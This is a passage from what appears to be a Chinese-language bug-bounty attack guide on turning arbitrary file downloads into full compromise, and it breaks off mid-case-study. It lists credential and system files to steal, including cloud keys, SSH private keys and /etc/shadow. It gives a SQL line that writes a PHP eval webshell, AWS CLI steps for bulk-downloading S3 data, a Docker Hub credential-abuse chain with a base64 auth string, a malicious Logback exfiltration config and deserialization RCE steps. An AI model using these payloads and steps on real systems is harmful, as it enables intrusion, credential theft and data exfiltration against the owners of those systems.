<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">路径</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">包含内容</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">价值说明</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.aws/credentials</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">AWS AccessKey/SecretKey</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">可直接接管云服务</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.aws/config</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">AWS区域配置</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">辅助利用</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.azure/accessTokens.json</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Azure令牌</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">接管Azure资源</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.docker/config.json</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Docker Hub凭证</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">可拉取私有镜像</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.kube/config</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Kubernetes集群凭证</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">接管K8s集群</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">~/.config/gcloud/credentials.db</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">GCP凭证</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">接管Google云</span></section></td></tr></tbody></table>  
**实战案例**  
：某目标通过任意文件下载获取/root/.aws/credentials  
，使用AWS CLI列出所有S3 bucket，发现包含敏感业务数据的存储桶。**奖金：6,000元**  
。  
### 3.3 系统敏感文件（万能备用）  
  
**Linux必读文件**  
：  
```
text
/etc/passwd                    # 用户列表
/etc/shadow                    # 密码哈希（需root）
/etc/hosts                     # 主机名解析
/etc/network/interfaces        # 网络配置
/proc/self/environ              # 环境变量（含密钥！）
/proc/net/arp                   # ARP缓存（发现内网）
/proc/net/tcp                   # 当前TCP连接
/proc/net/fib_trie               # 路由表
/root/.bash_history              # 历史命令
/root/.ssh/id_rsa                # SSH私钥
/var/log/auth.log                # SSH登录记录
```  
  
**Windows必读文件**  
：  
```
text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\debug\NetSetup.log
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  # PowerShell历史
C:\ProgramData\Microsoft\Search\Data\Applications\Windows\GatherLogs\SystemIndex\SystemIndex.*.gthr  # 敏感文件路径索引
```  
### 3.4 第三方组件配置  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">组件</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">配置文件</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">可能泄露</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">MySQL</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">my.ini</span></code><section><span leaf="">/</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">my.cnf</span></code></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">数据库密码</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">Redis</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">redis.conf</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">认证密码</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">Nginx</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">nginx.conf</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">站点配置、代理规则</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">Tomcat</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">tomcat-users.xml</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">管理后台密码</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">Jenkins</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">config.xml</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">构建任务、凭证</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">Docker</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">daemon.json</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Docker配置</span></section></td></tr></tbody></table>## 第四章 深度利用：从配置到沦陷的完整攻击链  
### 4.1 直接利用：数据库接管  
  
**场景**  
：从.env  
中获取MySQL密码  
  
**利用步骤**  
：  
1. 确认数据库端口是否可外连（3306）  
  
1. 若不能外连，尝试通过SSRF或内网代理连接  
  
1. 连接后查看数据库，获取用户表、业务数据  
  
1. 若secure_file_priv  
允许，尝试写Webshell  
  
**关键SQL**  
：  
```
sql
-- 查看文件写入权限
SHOW VARIABLES LIKE 'secure_file_priv';
-- 尝试写入Webshell（需知道Web路径）
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';
```  
### 4.2 云凭证接管  
  
**场景**  
：获取AWS AccessKey  
  
**利用步骤**  
：  
1. 配置AWS CLI：aws configure  
  
1. 枚举S3桶：aws s3 ls  
  
1. 下载敏感数据：aws s3 cp s3://bucket-name/ ./ --recursive  
  
1. 查看EC2实例：aws ec2 describe-instances  
  
1. 甚至可能创建新资源：aws ec2 run-instances  
  
**关键检查**  
：使用aws sts get-caller-identity  
确认凭证权限范围。  
### 4.3 Docker Hub凭证滥用  
  
**惊天内幕**  
：GitHub Actions的runner中硬编码了Docker Hub凭证。  
  
研究人员发现，所有GitHub Actions的runner中都包含~/.docker/config.json  
，内含Docker Hub凭证。这些凭证对所有runner通用！  
  
**利用方法**  
：  
1. 在GitHub Action中执行cat ~/.docker/config.json  
  
1. 获取Docker Hub用户名和密码  
  
1. 用凭证获取JWT token：curl -u username:password https://hub.docker.com/v2/users/login/  
  
1. 使用token拉取镜像：docker login -u username -p token  
  
1. 可耗尽Docker Hub的rate limit，导致GitHub Actions服务中断  
  
**漏洞状态**  
：GitHub已知晓但未完全修复。  
### 4.4 从加密key到反序列化RCE  
  
**CodeIgniter框架案例**  
：  
  
CodeIgniter框架将session保存在Cookie中，并通过反序列化加载。Cookie的完整性校验依赖encryption_key  
，保存在application/config/config.php  
中。  
  
**攻击链**  
：  
1. 通过任意文件下载获取config.php  
中的encryption_key  
  
1. 构造恶意的序列化payload  
  
1. 用key签名后放入Cookie  
  
1. 服务端反序列化时触发RCE  
  
**Laravel APP_KEY同理**  
：若获取到APP_KEY  
，可构造反序列化链（需配合其他漏洞）。  
### 4.5 SpringBoot Jar包逆向  
  
**SpringBoot环境下的利用链**  
：  
  
**Step1**  
：通过/proc/sched_debug  
获取进程信息，定位SpringBoot的PID  
  
**Step2**  
：通过/proc/[PID]/cmdline  
和/proc/[PID]/environ  
获取jar包绝对路径  
  
**Step3**  
：下载jar包到本地，解压分析  
  
**Step4**  
：从jar包中提取配置文件、甚至反编译源码找0day  
  
**实战价值**  
：获取完整源码后，可系统性挖掘漏洞，远超单一配置泄露的价值。  
### 4.6 Logback配置文件窃取环境变量  
  
**GoCD Agent的诡异漏洞**  
：  
  
GoCD Agent的日志机制（Logback）允许属性替换和自定义配置加载。如果攻击者在安装目录创建config  
文件夹并放入恶意agent-launcher-logback.xml  
，Agent会优先加载该配置。  
  
**恶意配置示例**  
：  
```
xml
<configuration>
  <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
    <encoder>
      <pattern>%n[!] EXFILTRATION_REPORT [!]%n- Host: ${HOSTNAME}%n- User: ${USERNAME}%n- Java: ${java.version}%n- WorkDir: ${user.dir}%n[!] END_OF_REPORT [!]%n%msg%n</pattern>
    </encoder>
  </appender>
  <root level="INFO">
    <appender-ref ref="STDOUT" />
  </root>
</configuration>
```  
  
**后果**  
：日志输出中泄露主机名、用户名、Java版本、工作目录等系统环境变量，其中可能包含云凭证。  
### 4.7 GitHub Actions runner中的硬编码凭证  
  
**意外发现**  
：GitHub Actions的runner中硬编码了Docker Hub凭证，对所有runner通用。  
```
json
{
  "auths": {
    "https://index.docker.io/v1/": {
      "auth": "Z2l0aHViYWN0aW9uczpldWxrZ2ozenVpc2RqaW92bmJzeGdoY2FjdG9y"
    }
  }
}
```  
  
**影响**  
：任何人可获取这些凭证，耗尽Docker Hub的rate limit，导致GitHub Actions服务中断。  
## 第五章 实战案例库（完整攻击链）  
### 【案例1】从.env到AWS接管的45分钟  
  
**目标**  
：某SaaS平台**耗时**  
：45分钟**奖金**  
：12,000元  
  
**攻击路径**  
：  
1. **入口发现**  
：扫描发现/backup/.env  
文件可读  
  
1. **信息获取**  
：文件中包含AWS_ACCESS_KEY_ID  
和AWS_SECRET_ACCESS_KEY  
  
1. **权限验证**  
